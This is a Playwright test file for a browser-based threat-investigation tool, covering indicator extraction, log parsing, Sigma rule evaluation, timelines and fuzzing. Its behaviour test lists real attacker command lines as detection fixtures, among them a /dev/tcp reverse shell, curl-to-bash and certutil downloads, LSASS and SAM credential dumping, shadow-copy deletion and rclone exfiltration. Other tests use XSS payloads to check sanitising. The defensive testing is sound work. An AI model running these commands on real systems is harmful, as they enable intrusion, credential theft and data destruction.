// Real-world input, not the demo data: messy indicators, many log formats, behaviour
// on real command lines (and benign look-alikes that must NOT be flagged), duplicates
// that must and must not merge, odd timelines, broken files, and random input fed to
// every engine. Each check states the right answer, not just "no crash".
const { test, expect } = require('@playwright/test');
const { open, noErrors, budget } = require('./helpers');

test('indicators: defanged, unicode, IPv6, hashes and the things that are NOT indicators', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { const X = t => E.extract(t).map(e => e.k + ':' + e.v).sort(); return {
    defang:X('C2 at hxxps://evil[.]example[.]com/a?b=1, 45[.]33[.]32[.]156, user[at]corp[.]com, admin(at)site(.)com and evil{.}net'),
    idn:X('visit раураl.com and xn--80ak6aa92e.com'),
    ipv6:X('connected to 2001:db8::1 and fe80::1%eth0'),
    email:X('mail john.doe+tag@example.co.uk, "Bob" <Bob@Sub.Example.ORG>'),
    hash:X('md5 d41d8cd98f00b204e9800998ecf8427e sha1 da39a3ee5e6b4b0d3255bfef95601890afd80709 sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'),
    cve:X('Patched cve-2021-44228 and CVE-2024-3400.'),
    trailing:X('Go to https://ex.com/a). Or https://ex.com/b.'),
    btc:X('pay bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'),
    none:[X('The meeting is at 10.30 on Monday, version 2.1, see section 4.2.1'), X('Windows 10.0.17763 build 1.2'), X('ClientId {3F2504E0-4F89-11D3-9A0C-0305E82C3301}'), X('opened invoice.pdf and notes.txt'), X('')],
  }; });
  expect(R.defang).toEqual(expect.arrayContaining(['ipv4:45.33.32.156', 'domain:evil.example.com', 'url:https://evil.example.com/a?b=1', 'email:user@corp.com', 'email:admin@site.com', 'domain:evil.net']));
  expect(R.idn).toEqual(['domain:xn--80ak6aa92e.com', 'domain:раураl.com']);              // kept whole, never cut to "l.com"
  expect(R.ipv6).toEqual(expect.arrayContaining(['ipv6:2001:db8::1', 'ipv6:fe80::1']));
  expect(R.email).toEqual(['email:bob@sub.example.org', 'email:john.doe+tag@example.co.uk']);
  expect(R.hash).toEqual(expect.arrayContaining(['md5:d41d8cd98f00b204e9800998ecf8427e', 'sha1:da39a3ee5e6b4b0d3255bfef95601890afd80709', 'sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855']));
  expect(R.cve).toEqual(['cve:CVE-2021-44228', 'cve:CVE-2024-3400']);
  expect(R.trailing).toEqual(expect.arrayContaining(['url:https://ex.com/a', 'url:https://ex.com/b']));
  expect(R.btc).toEqual(['btc:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh']);
  for (const n of R.none) expect(n).toEqual([]);                                            // prose, versions, GUIDs, documents: nothing
  noErrors(errors);
});

test('log formats: the same kind of event from nine products is read into the same fields, and a Sigma rule fires on all of them', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const L = {
      sysmonXml: '<Event><System><EventID>1</EventID><Computer>WS1</Computer></System><EventData><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell -nop -enc SQBFAFgA</Data><Data Name="ParentImage">C:\\Windows\\explorer.exe</Data></EventData></Event>',
      ecsJson: '{"@timestamp":"2026-11-01T10:00:00Z","host":{"name":"WS2"},"process":{"command_line":"powershell -nop -enc SQBFAFgA","executable":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"},"event":{"code":"1"}}',
      sysmonKv: 'EventID=1 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell -nop -enc SQBFAFgA" User=CORP\\bob',
      winText: 'A new process has been created.\nCreator Subject:\n  Account Name: bob\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Process Command Line: powershell -nop -enc SQBFAFgA\n  Creator Process Name: C:\\Windows\\explorer.exe',
      winTextOneLine: 'A new process has been created. New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Process Command Line: powershell -nop -enc SQBFAFgA',
    };
    const net = {
      cef: 'CEF:0|Vendor|Product|1.0|100|Blocked|7|src=10.0.0.5 dst=203.0.113.9 dpt=443 suser=alice act=blocked',
      leef: 'LEEF:2.0|IBM|QRadar|1.0|Login|src=192.0.2.4\tusrName=bob',
      ssh: 'Nov  1 10:00:00 web01 sshd[123]: Failed password for invalid user admin from 198.51.100.7 port 51515 ssh2',
      apache: '198.51.100.7 - - [01/Nov/2026:10:00:00 +0000] "GET /wp-login.php HTTP/1.1" 404 512 "-" "curl/8.0"',
      forti: 'date=2026-11-01 time=10:00:00 devname=FGT logid=0000000013 srcip=10.1.1.1 dstip=8.8.8.8 dstport=53 action=accept',
    };
    ensureRules(); const rule = DB.rules.find(r => r.title === 'PowerShell Encoded Command Execution'), P = sigmaParse(rule.code);
    const proc = Object.fromEntries(Object.entries(L).map(([k, t]) => { const f = recFields({ title: '', body: t, host: '', source: '' }); return [k, { img: (f.image || '').split('\\').pop(), cmd: f.commandline || '', fires: sigmaEval(P, f) }]; }));
    const benign = recFields({ title: '', body: 'EventID=1 Image="C:\\Windows\\System32\\cmd.exe" CommandLine="cmd /c dir"', host: '', source: '' });
    const n = Object.fromEntries(Object.entries(net).map(([k, t]) => { const p = parseLog(t); return [k, p ? { fmt: p.format, n: p.norm } : null]; }));
    return { proc, benignFires: sigmaEval(P, benign), net: n, empty: parseLog(''), junk: parseLog('just some words without structure') };
  });
  for (const [k, v] of Object.entries(R.proc)) { expect(v.img, k).toBe('powershell.exe'); expect(v.cmd, k).toContain('-enc'); expect(v.fires, k).toBe(true); }
  expect(R.benignFires).toBe(false);
  expect(R.net.cef.n['src.ip']).toBe('10.0.0.5'); expect(R.net.cef.n['dst.port']).toBe('443'); expect(R.net.cef.n.user).toBe('alice');
  expect(R.net.leef.n['src.ip']).toBe('192.0.2.4'); expect(R.net.leef.n.user).toBe('bob');
  expect(R.net.ssh.n['src.ip']).toBe('198.51.100.7'); expect(R.net.ssh.n.user).toBe('admin'); expect(R.net.ssh.fmt).toContain('SSH');
  expect(R.net.apache.n['src.ip']).toBe('198.51.100.7'); expect(R.net.apache.n.url).toBe('/wp-login.php');
  expect(R.net.forti.fmt).toContain('FortiGate'); expect(R.net.forti.n['dst.ip']).toBe('8.8.8.8');
  expect(R.empty).toBeNull();
  noErrors(errors);
});

test('behaviour: real attacker command lines are recognised; everyday admin commands are not', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { const tags = t => E.observations({ title: '', body: t, tags: [], ents: E.extract(t), host: '' }).map(o => o.tag);
    const bad = [['powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', 'encoded'], ['certutil -urlcache -split -f http://203.0.113.5/a.exe a.exe', 'download'], ['bitsadmin /transfer j http://x.example/a.exe C:\\a.exe', 'download'],
      ['powershell IEX (New-Object Net.WebClient).DownloadString("http://x/a")', 'download'], ['curl -fsSL http://x.example/i.sh | bash', 'download'], ['wevtutil cl Security', 'anti-forensics'], ['history -c', 'anti-forensics'],
      ['vssadmin delete shadows /all /quiet', 'impact'], ['bcdedit /set {default} recoveryenabled No', 'impact'], ['schtasks /create /tn Upd /tr C:\\x.exe /sc onlogon', 'persistence'], ['sc create svc binPath= C:\\x.exe', 'persistence'],
      ['echo "* * * * * /tmp/x" >> /etc/crontab', 'persistence'], ['net user hacker P@ssw0rd /add', 'account'], ['net localgroup administrators hacker /add', 'account'], ['mshta http://evil.example/x.hta', 'proxy execution'],
      ['rundll32.exe C:\\Users\\Public\\x.dll,Start', 'proxy execution'], ['regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll', 'proxy execution'], ['procdump64.exe -ma lsass.exe out.dmp', 'credentials'],
      ['rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 624 C:\\temp\\l.dmp full', 'credentials'], ['reg save HKLM\\SAM sam.hiv', 'credentials'], ['nltest /domain_trusts', 'discovery'], ['net group "domain admins" /domain', 'discovery'],
      ['psexec \\\\FS01 -s cmd', 'lateral movement'], ['wmic /node:10.0.0.9 process call create calc', 'lateral movement'], ['Set-MpPreference -DisableRealtimeMonitoring $true', 'defenses off'], ['netsh advfirewall set allprofiles state off', 'defenses off'],
      ['7z a -pS3cret loot.7z C:\\Finance', 'staging'], ['rclone copy C:\\Finance mega:loot', 'exfiltration'], ['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'c2'], ['Invoice.pdf.exe opened from Downloads', 'lure']];
    const ok = ['schtasks /query /fo list', 'net user bob', 'certutil -hashfile a.exe SHA256', 'wevtutil qe Security /c:5', 'vssadmin list shadows', 'whoami', 'curl https://example.com -o page.html', 'tar -czf backup.tgz /home',
      'Get-Service WinDefend', 'regsvr32 /s mydll.dll', 'ipconfig /all', 'git push origin main', 'The quarterly report is attached', 'ping 8.8.8.8', 'Get-ChildItem C:\\Users'];
    return { bad: bad.map(([t, want]) => [t, want, tags(t)]), ok: ok.map(t => [t, tags(t)]) }; });
  for (const [t, want, got] of R.bad) expect(got, t).toContain(want);
  for (const [t, got] of R.ok) expect(got, t).toEqual([]);
  noErrors(errors);
});

test('duplicates: written differently but the same → merged; similar but different → kept apart', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const c = { id: 'c-dup', code: 'DUP-1', name: 'Dups', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    const T = (type, v) => { const t = TYPES[type]; const e = { id: uid('v'), caseId: 'c-dup', type, fields: { [t.fields[0][0]]: v }, priority: 'low', starred: false, tags: [], notes: '', src: '', created: Date.now() }; normEntry(e); DB.entries.push(e); return e; };
    const same = [['email', 'Bob@Corp.com', 'bob@corp[.]com'], ['domain', 'www.Evil.example', 'evil.example.'], ['url', 'https://x.example/a/', 'hxxps://x.example/a'], ['phone', '+1 (555) 010-2030', '555.010.2030'],
      ['person', 'Jordan Okafor', 'Okafor, Jordan'], ['person', 'José Núñez', 'Jose Nunez'], ['username', '@lampmaker', 'LampMaker'], ['ip', '203.0.113.7', '203.0.113.7']];
    const diff = [['email', 'john.doe@corp.com', 'jane.doe@corp.com'], ['domain', 'mail.example.com', 'example.com'], ['phone', '+1 555 010 2030', '+1 555 010 2031'], ['person', 'John Smith', 'John Smithson'],
      ['username', 'bob1', 'bob2'], ['crypto', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', '1a1zp1ep5qgefi2dmptftl5slmv7divfna'], ['ip', '203.0.113.7', '203.0.113.70']];
    const pairs = [...same.map(x => ['same', ...x]), ...diff.map(x => ['diff', ...x])].map(([want, type, a, b]) => { const A = T(type, a), B = T(type, b); return { want, type, a, b, A: A.id, B: B.id }; });
    const G = dupGroups('c-dup'), together = (x, y) => G.some(g => g.G.some(e => e.id === x) && g.G.some(e => e.id === y));
    const loose = G.filter(g => !g.sure).map(g => g.G.map(primary));
    return { res: pairs.map(p => [p.want, p.type, p.a, p.b, together(p.A, p.B)]), loose };
  });
  for (const [want, type, a, b, got] of R.res) expect(got, `${type}: ${a} vs ${b}`).toBe(want === 'same');
  noErrors(errors);
});

test('odd timelines: empty, one event, all at the same second, no times, far future — patterns and the attack chain stay sensible', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const out = {}, mk = (id, ts, body, tags) => ({ id, caseId: 'c-odd', type: 'evidence', title: id, body: body || '', tsRaw: '', tsZone: 'explicit', ts, host: 'H', source: 's', tags: tags || [], ents: E.extract(body || ''), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' });
    const c = { id: 'c-odd', code: 'ODD-1', name: 'Odd', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    const run = (name, recs) => { DB.records = DB.records.filter(r => r.caseId !== 'c-odd').concat(recs); mutate(name); const D = derive('c-odd'); let A, C, html;
      try { A = tlxAnalyse(D); C = chainOf(c, D); html = tlxView(D) + chainView(c, D); } catch (e) { return 'THROW ' + e.message; }
      return { empty: !!A.empty, bursts: (A.bursts || []).length, gaps: (A.gaps || []).length, nan: /NaN|undefined|Infinity/.test(html), first: A.first ? A.first.r.id : null, future: A.time.future.length, seen: C.seen.length }; };
    const t0 = Date.UTC(2026, 9, 1, 9);
    out.none = run('none', []);
    out.one = run('one', [mk('a', t0, 'powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA')]);
    out.same = run('same', Array.from({ length: 50 }, (_, i) => mk('s' + i, t0, 'event ' + i)));
    out.noTs = run('noTs', [mk('x', null, 'x'), mk('y', null, 'y')]);
    out.future = run('future', [mk('f1', t0, 'a'), mk('f2', t0 + 6e4, 'b'), mk('f3', Date.now() + 400 * 864e5, 'c')]);
    out.real = run('real', [mk('r1', t0, 'Invoice.pdf.exe opened', ['phishing']), mk('r2', t0 + 6e4, 'powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi'), mk('r3', t0 + 12e4, 'schtasks /create /tn x /tr c:\\x.exe'), mk('r4', t0 + 36e5 * 30, 'rclone copy C:\\data mega:x')]);
    return out; });
  for (const [k, v] of Object.entries(R)) { expect(typeof v, k).toBe('object'); expect(v.nan, k + ' shows NaN/undefined').toBe(false); }
  expect(R.none.empty).toBe(true); expect(R.one.empty).toBe(true); expect(R.noTs.empty).toBe(true);
  expect(R.same.bursts).toBeLessThanOrEqual(1); expect(R.same.gaps).toBe(0);
  expect(R.future.future).toBe(1);
  expect(R.real.first).toBe('r1'); expect(R.real.seen).toBeGreaterThanOrEqual(4); expect(R.real.gaps).toBeGreaterThanOrEqual(1);
  noErrors(errors);
});

test('broken and unusual files: not-a-picture, empty, SVG and a broken video are stored without crashing anything', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/media');
  const R = await page.evaluate(async () => {
    const files = [new File([new Uint8Array([1, 2, 3, 4, 5])], 'fake.jpg', { type: 'image/jpeg' }), new File([], 'empty.png', { type: 'image/png' }),
      new File(['<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(1)</script><rect width="10" height="10"/></svg>'], 'x.svg', { type: 'image/svg+xml' }),
      new File([new Uint8Array(4096).fill(7)], 'broken.mp4', { type: 'video/mp4' }), new File(['<html><script>alert(1)</script>hi</html>'], 'page.html', { type: 'text/html' })];
    draft.caseId = 'c-lantern'; await attachFiles(files.slice(0, 4)); await importWebPages([files[4]]);
    const I = caseMediaItems('c-lantern'); return { names: I.map(x => x.a.name).sort(), insight: (() => { try { return picView(theCase('c-lantern')).length > 0; } catch (e) { return 'THROW ' + e.message; } })() }; });
  expect(R.names).toEqual(expect.arrayContaining(['broken.mp4', 'empty.png', 'fake.jpg', 'x.svg']));
  expect(R.insight).toBe(true);
  await page.evaluate(() => { UI.mdV = 'files'; renderMain(); }); await page.waitForTimeout(800);
  expect(await page.evaluate(() => window.__alerted || false)).toBe(false);
  // Playwright's trace recorder re-reads blob: pictures from inside the page, which the app's own security policy refuses; that is the recorder, not the app
  noErrors(errors.filter(e => !/Connecting to 'blob:/.test(e)));
});

test('every built-in Sigma rule converts to every SIEM and survives the evasion check', async ({ page }) => {
  test.setTimeout(120_000);
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { ensureRules(); const bad = [], S = DB.rules.filter(r => r.type === 'sigma');
    const balanced = q => { let d = 0, inS = false, inD = false; for (let i = 0; i < q.length; i++) { const ch = q[i]; if (ch === '\\') { i++; continue; } if (ch === '"' && !inS) inD = !inD; else if (ch === "'" && !inD) { if (q[i + 1] === "'" && inS) { i++; continue; } inS = !inS; } else if (!inS && !inD) { if (ch === '(') d++; if (ch === ')') d--; if (d < 0) return false; } } return d === 0 && !inS && !inD; };
    let conv = 0, ev = 0;
    for (const r of S) { for (const b of Object.keys(DL_BACK)) { let q; try { q = sigmaToQuery(r.code, b); } catch (e) { bad.push(r.title + ' / ' + b + ': THROW ' + e.message); continue; }
        if (q.error) continue; conv++; if (!q.q || /undefined|NaN|\[object/.test(q.q)) bad.push(r.title + ' / ' + b + ': empty or undefined'); else if (!balanced(q.q)) bad.push(r.title + ' / ' + b + ': unbalanced'); }
      try { dlEvasion(r, r.code); ev++; } catch (e) { bad.push(r.title + ' evasion: THROW ' + e.message); } }
    return { n: S.length, conv, ev, bad: bad.slice(0, 15) }; });
  expect(R.bad).toEqual([]);
  expect(R.conv).toBeGreaterThan(R.n * 5 * 0.95);
  noErrors(errors);
});

test('random input never breaks the engines', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    let seed = 7; const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    const pool = 'aZ09 .:/\\-_@[](){}<>|"\'=,;!?#$%^&*~`\n\t\u00e9\u0436\u4e2d\u{1F600}\u200b\u0000hxxp://[.]10.0.0.1 CEF:0| LEEF:2.0| <Event><EventID> {"a": EventID=4688 New Process Name: -enc ';
    const gen = n => { let s = ''; for (let i = 0; i < n; i++) s += pool[Math.floor(rnd() * pool.length)]; return s; };
    const fails = []; let slow = 0;
    for (let i = 0; i < 400; i++) { const s = gen(1 + Math.floor(rnd() * (i % 50 === 0 ? 20000 : 300))); const t0 = performance.now();
      for (const [name, fn] of [['extract', () => E.extract(s)], ['parseLog', () => parseLog(s)], ['recFields', () => recFields({ title: s.slice(0, 20), body: s, host: '', source: '' })], ['observations', () => E.observations({ title: '', body: s, tags: [], ents: E.extract(s), host: '' })],
        ['sigma', () => { const p = sigmaParse('detection:\n    s:\n        CommandLine|contains: \'' + s.slice(0, 30).replace(/'/g, '') + '\'\n    condition: s'); return p.cond ? sigmaEval(p, recFields({ title: '', body: s, host: '', source: '' })) : 0; }],
        ['noteInline', () => noteInline(s)], ['dupNorm', () => dupNorm({ type: 'person', fields: { name: s } })], ['lineTime', () => E.lineTime(s)]]) { try { fn(); } catch (e) { fails.push(name + ': ' + e.message + ' :: ' + JSON.stringify(s.slice(0, 60))); } }
      if (performance.now() - t0 > 400) slow++; }
    const inl = noteInline('<img src=x onerror=alert(1)> **b** `c`');
    return { fails: fails.slice(0, 10), slow, safe: !/<img/.test(inl) && /<b>b<\/b>/.test(inl) }; });
  expect(R.fails).toEqual([]); expect(R.slow).toBe(0); expect(R.safe).toBe(true);
  noErrors(errors);
});

test('a workspace with nothing in it: every new screen draws', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => { DB.cases = []; DB.records = []; DB.entries = []; DB.links = []; DB.notes = []; DB.active = null; DB.autos = []; mutate('empty'); });
  for (const h of ['#/today', '#/notes', '#/playbooks', '#/detections', '#/feeds', '#/home']) { await page.evaluate(h => go(h), h); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  await page.evaluate(() => { UI.pbTab = 'auto'; go('#/playbooks'); }); await expect(page.locator('.au-intro')).toBeVisible();
  await page.evaluate(() => { const c = { id: 'c-new', code: 'NEW-1', name: 'New', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c); DB.active = 'c-new'; mutate('c'); });
  for (const tab of ['overview', 'vault', 'entities', 'timeline', 'media', 'graph', 'analysis']) { await page.evaluate(t => go(caseHash('c-new', t)), tab); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  for (const m of ['patterns', 'chain']) { await page.evaluate(m => { UI.tlMode = m; go(caseHash('c-new', 'timeline')); renderMain(); }, m); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  await page.evaluate(() => { UI.mdV = 'pic'; go(caseHash('c-new', 'media')); renderMain(); }); await expect(page.locator('#main')).not.toContainText('failed to draw');
  noErrors(errors);
});

test('the graph button on a vault card opens the graph on that entry', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/vault');
  await page.evaluate(() => { DB.prefs.vLay = 'cards'; renderMain(); });
  const card = page.locator('.ec2[data-id=v-actor]'); await card.hover();
  await card.locator('[data-act=showInGraph]').click();
  await expect.poll(() => page.evaluate(() => location.hash)).toBe('#/case/c-lantern/graph');
  await expect.poll(() => page.evaluate(() => typeof cy !== 'undefined' && cy && cy.getElementById('v-actor').selected())).toBe(true);
  // the same from the details panel
  await page.evaluate(() => go(caseHash('c-lantern', 'vault'))); await expect(page.locator('.ec2').first()).toBeVisible();
  await page.evaluate(() => selectEntry('v-handle'));
  await page.locator('#insp [data-act=showInGraph]').click();
  await expect.poll(() => page.evaluate(() => typeof cy !== 'undefined' && cy && cy.getElementById('v-handle').selected())).toBe(true);
  noErrors(errors);
});

test('broken versions of real log formats never break the importer', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const samples = [
      'timestamp,host,user,event\n2024-03-01T10:00:00Z,WS-01,alice,logon\n2024-03-01T10:05:00Z,WS-01,alice,"cmd.exe /c whoami"',
      '{"@timestamp":"2024-03-01T10:00:00Z","event":{"code":4688},"process":{"command_line":"powershell -enc SQBFAFgA"}}\n{"@timestamp":"2024-03-01T10:01:00Z","host":{"name":"DC01"}}',
      '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4624</EventID><TimeCreated SystemTime="2024-03-01T10:00:00.000Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">bob</Data><Data Name="LogonType">10</Data></EventData></Event>',
      'CEF:0|Vendor|FW|1.0|100|Blocked|5|src=10.0.0.5 dst=203.0.113.9 dpt=443 act=block rt=Mar 01 2024 10:00:00',
      'Mar  1 10:00:00 web01 sshd[123]: Failed password for root from 203.0.113.50 port 51234 ssh2',
      '{"eventVersion":"1.08","eventTime":"2024-03-01T10:00:00Z","eventName":"ConsoleLogin","sourceIPAddress":"198.51.100.7","userIdentity":{"type":"IAMUser","userName":"ops"}}',
      '#fields\tts\tuid\tid.orig_h\tid.resp_h\tquery\n1709287200.0\tC1\t10.0.0.5\t8.8.8.8\tevil.example',
      '<Events><Event><System><EventID>4625</EventID><TimeCreated SystemTime="2024-03-01T13:00:00.000Z"/></System><EventData><Data Name="TargetUserName">admin</Data></EventData></Event><Event><System><EventID>4624</EventID></System></Event></Events>',
      'CreationDate,UserIds,Operations,AuditData\r\n2024-03-01T12:00:00Z,a@b.example,New-InboxRule,"{""CreationTime"":""2024-03-01T12:00:00"",""Operation"":""New-InboxRule"",""UserId"":""a@b.example"",""ClientIP"":""[2001:db8::7]:5"",""Workload"":""Exchange""}"',
      '[{"published":"2024-03-01T11:00:00Z","eventType":"user.session.start","actor":{"alternateId":"e@x.example"},"client":{"ipAddress":"45.33.32.156"},"outcome":{"result":"FAILURE"}}]',
    ];
    let seed = 11; const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648, pick = a => a[Math.floor(rnd() * a.length)];
    const mutate = s => { const k = Math.floor(rnd() * 10), i = Math.floor(rnd() * s.length);
      switch (k) {
        case 0: return s.slice(0, i);                                             // cut off mid-way
        case 1: return '﻿' + s.replace(/\n/g, '\r\n');                      // BOM and Windows line ends
        case 2: return s.slice(0, i) + s.slice(i + 1 + Math.floor(rnd() * 20));   // bytes missing
        case 3: return s.slice(0, i) + 'x'.repeat(200000) + s.slice(i);          // one huge field
        case 4: return s.replace(/"/g, () => rnd() < .3 ? '' : '"');              // broken quoting
        case 5: return '['.repeat(5000) + s + ']'.repeat(10);                      // deeply nested
        case 6: return Array(3000).fill(s).join('\n');                             // many rows
        case 7: return s.replace(/\d/g, () => rnd() < .2 ? '\u0000' : String(Math.floor(rnd() * 10)));
        case 8: return s.split('').reverse().join('');
        default: return s + '\n' + pick(samples).slice(0, i);                      // two formats mixed
      } };
    /* the file importer's own steps: read the format, guess the columns, make records, then every engine on them */
    const importAs = s => { const P = logParse(s, 'x.log'), cols = [...new Set(P.rows.slice(0, 200).flatMap(r => Object.keys(r)))], M = { time: logGuess(cols, 'time'), title: logGuess(cols, 'title'), host: logGuess(cols, 'host'), source: logGuess(cols, 'source') };
      const L = P.rows.slice(0, 300).map(r => logRec(r, M, 'x.log')); L.slice(0, 60).forEach(r => { E.observations(r); recFields(r); parseLog(r.body); }); return L; };
    const fails = []; let slow = 0, recs = 0;
    for (let i = 0; i < 160; i++) { const s = mutate(pick(samples)), t0 = performance.now();
      try { recs += importAs(s).length; }
      catch (e) { fails.push(e.message + ' :: ' + JSON.stringify(s.slice(0, 80))); }
      if (performance.now() - t0 > 1500) slow++; }
    // the clean samples still import
    const clean = samples.map(s => importAs(s).length);
    const csvTimes = importAs(samples[0]).map(r => r.ts).filter(Boolean).length;          // times read from the right column
    return { fails: fails.slice(0, 8), slow, recs, clean, csvTimes };
  });
  expect(R.fails).toEqual([]); expect(R.slow).toBe(0);
  expect(R.clean.every(n => n >= 1)).toBe(true); expect(R.clean[0]).toBe(2); expect(R.csvTimes).toBe(2);
  noErrors(errors);
});

test('rules over one case: what fired, what looks suspicious but nothing caught, noisy rules — and drafting from a blind spot closes it', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => {
    const c = { id: 'c-cr', code: 'CR-1', name: 'Rules check', color: '#6366f1', status: 'active', created: Date.now(), updated: Date.now() }; DB.cases.push(c);
    const T = Date.UTC(2024, 2, 1, 10), mk = (i, title, body, extra) => ({ id: 'r-cr' + i, caseId: 'c-cr', type: 'evidence', title, body, ts: T + i * 60000, tsRaw: '', source: 'test', host: 'WS-01', tags: [], ents: extractRich(body), addedAt: Date.now(), ...extra });
    DB.records.push(
      mk(1, 'Encoded PowerShell', 'EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"'),
      mk(2, 'Odd service on DC', 'EventID=7045 ServiceName=zzqx ImagePath=C:\\ProgramData\\zzqx\\svc.exe', { tags: ['persistence'] }),
      mk(3, 'User logon', 'EventID=4624 TargetUserName=alice LogonType=2'),
      mk(4, 'User logon', 'EventID=4624 TargetUserName=bob LogonType=2'),
      mk(5, 'Browser start', 'EventID=1 Image=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe CommandLine=chrome.exe'),
      mk(6, 'Explorer', 'EventID=1 Image=C:\\Windows\\explorer.exe CommandLine=explorer.exe'));
    DB.rules.unshift({ id: 'r-loud', type: 'sigma', title: 'Anything with EventID', desc: '', code: "title: Anything with EventID\nlogsource:\n    product: windows\ndetection:\n    s:\n        eventid|re: '.+'\n    condition: s\nlevel: low", severity: 'low', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], created: Date.now(), updated: Date.now() });
    rev++; DB.active = 'c-cr'; UI.tlMode = 'rules'; go(caseHash('c-cr', 'timeline'));
  });
  await expect(page.locator('.cr-sum')).toBeVisible({ timeout: 20000 });
  const R = await page.evaluate(() => ({ n: CR.res.n, fired: CR.res.rows.map(x => x.r.id), blind: CR.res.blind.map(x => x.r.id), noisy: CR.res.noisy.map(x => x.r.id),
    encCaughtBy: (CR.res.caught.get('r-cr1') || []).filter(r => r.id !== 'r-loud').length }));
  expect(R.n).toBe(6);
  expect(R.encCaughtBy).toBeGreaterThan(0);                     // a built-in rule catches the encoded PowerShell
  expect(R.noisy).toEqual(['r-loud']);                          // fires on all six events
  // the loud rule catches everything, so nothing is "not caught" while it is on; take it out and look again
  await page.evaluate(() => { DB.rules = DB.rules.filter(r => r.id !== 'r-loud'); mutate('test'); renderMain(); });
  await expect.poll(() => page.evaluate(() => CR.res && !DB.rules.some(r => r.id === 'r-loud') && CR.sig === crSig('c-cr') && CR.res.blind.map(x => x.r.id).join())).toContain('r-cr2');
  const blind = await page.evaluate(() => CR.res.blind.map(x => x.r.id));
  expect(blind).not.toContain('r-cr3'); expect(blind).not.toContain('r-cr5');   // harmless events are not blind spots
  expect(blind).not.toContain('r-cr1');                                         // caught by a rule
  await page.click('[data-act=crf][data-v=blind]');
  await expect(page.locator('.cr-bl li:has-text("Odd service on DC")')).toContainText('persistence');
  // draft a rule from the blind spot: it then counts as caught
  const n0 = await page.evaluate(() => DB.rules.length);
  await page.locator('.cr-bl li:has-text("Odd service on DC") [data-act=crDraft]').click();
  expect(await page.evaluate(() => DB.rules.length)).toBe(n0 + 1);
  await page.evaluate(() => { DB.active = 'c-cr'; UI.tlMode = 'rules'; go(caseHash('c-cr', 'timeline')); });
  await expect.poll(() => page.evaluate(() => CR.res && CR.sig === crSig('c-cr') && !CR.res.blind.some(x => x.r.id === 'r-cr2'))).toBe(true);
  // opening an event and a rule from the view
  await page.click('[data-act=crf][data-v=caught]');
  await page.locator('.cr-r [data-act=crRule]').first().click(); await expect(page).toHaveURL(/#\/detections/);
  noErrors(errors);
});

test('rule health over time: test history and regressions, rules without tests, look-alike rules, what changed since the last check', async ({ page }) => {
  const errors = await open(page, '#/detections');
  const R = await page.evaluate(async () => {
    const code = "title: Whoami run\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    s:\n        Image|endswith: '\\\\whoami.exe'\n    condition: s\nlevel: low";
    const mk = (id, title, c, tests) => ({ id, type: 'sigma', title, desc: '', code: c, severity: 'low', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], tests, created: Date.now(), updated: Date.now() });
    const r = mk('r-hw', 'Whoami run', code, [{ kind: 'hit', text: 'Image="C:\\Windows\\System32\\whoami.exe"' }, { kind: 'miss', text: 'Image="C:\\Windows\\notepad.exe"' }]);
    DB.rules.unshift(r, mk('r-untested', 'My untested rule', code.replace('whoami', 'net1'), undefined), mk('r-twin', 'Whoami run again', code.replace('title: Whoami run', 'title: Whoami run again'), undefined));
    // two saves that pass, then an edit that breaks a test
